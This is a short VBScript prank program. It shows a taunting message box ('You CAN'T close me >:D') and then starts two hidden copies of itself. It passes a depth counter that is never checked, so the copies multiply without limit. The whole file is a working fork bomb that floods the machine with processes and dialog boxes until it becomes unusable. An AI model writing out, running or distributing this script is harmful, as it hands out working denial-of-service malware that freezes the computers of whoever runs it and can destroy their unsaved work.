Option Explicit

Dim shell, depth, i
Set shell = CreateObject("WScript.Shell")

If WScript.Arguments.Count > 0 Then
    depth = CInt(WScript.Arguments(0))
Else
    depth = 0
End If

MsgBox "You CAN'T close me >:D", vbOKOnly, "lol"

For i = 1 To 2
    shell.Run "wscript.exe """ & WScript.ScriptFullName & """ " & (depth + 1), 0, False
Next

WScript.Quit
